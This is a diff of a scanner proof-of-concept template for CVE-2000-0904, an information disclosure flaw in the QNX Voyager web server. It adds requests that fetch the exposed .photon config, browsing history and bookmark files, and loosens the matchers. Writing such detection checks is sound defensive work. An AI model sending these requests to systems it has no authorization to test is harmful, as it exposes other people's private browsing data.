@@ -1,33 +1,59 @@
 [info]
-author = "ave"
-description = "通过尝试访问 Web 文档根目录下的 .photon 目录来验证是否存在敏感信息泄露漏洞"
+author = "AVE"
+description = "检测 QNX 405 演示光盘中 Voyager Web Server 2.01B 的 .photon 目录敏感信息泄露漏洞。远程攻击者可通过访问 /.photon/voyager/config.full 等路径获取 Web 客户端配置、浏览历史、书签等敏感信息。"
 id = "POC-AVE-2000-0659"
-name = "QSSL Voyager 2.01B .photon Directory Information Disclosure PoC"
+name = "QSSL Voyager .photon Directory Information Disclosure PoC"
 severity = "medium"
-tags = ["ave-2000-0659"]
+tags = [
+    "cve-2000-0904",
+    "information-disclosure",
+    "voyager",
+    "qnx",
+]
 vuln_id = [
     "CVE-2000-0904",
     "AVE-2000-0659",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/.photon/"
+path = "/{{BaseURL}}/.photon/voyager/config.full"
 protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    ".photon",
-    "Index of /",
+    "Photon",
+    "voyager",
+    "config",
 ]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/.photon/voyager/history.html"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<html>",
+    "history",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/.photon/voyager/hotlist"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["hotlist"]
